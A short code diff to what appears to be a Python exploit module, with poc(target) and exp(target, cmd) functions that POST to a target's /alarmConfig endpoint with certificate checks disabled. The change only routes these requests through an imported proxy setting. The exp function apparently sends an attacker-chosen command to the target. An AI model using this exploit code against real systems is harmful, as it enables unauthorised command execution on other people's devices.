@@ -2,6 +2,8 @@
 # _*_ coding:utf-8 _*_
 import json
 import requests
+
+from Config.config_proxies import proxies
 from Config.config_requests import ua
 
 requests.packages.urllib3.disable_warnings()
@@ -29,7 +31,7 @@ def poc(target):
     }
 
     try:
-        r = requests.post(target+"/alarmConfig",headers=headers, data=data, verify=False)
+        r = requests.post(target+"/alarmConfig",headers=headers, data=data, verify=False,proxies=proxies)
         res=json.loads(r.text)
         if res['def']:
             result['target'] = target
@@ -55,7 +57,7 @@ def exp(target,cmd):
     }
 
     try:
-        r = requests.post(target+"/alarmConfig",headers=headers, data=data, verify=False)
+        r = requests.post(target+"/alarmConfig",headers=headers, data=data, verify=False,proxies=proxies)
         res=json.loads(r.text)
         print(res['def'])
     except:
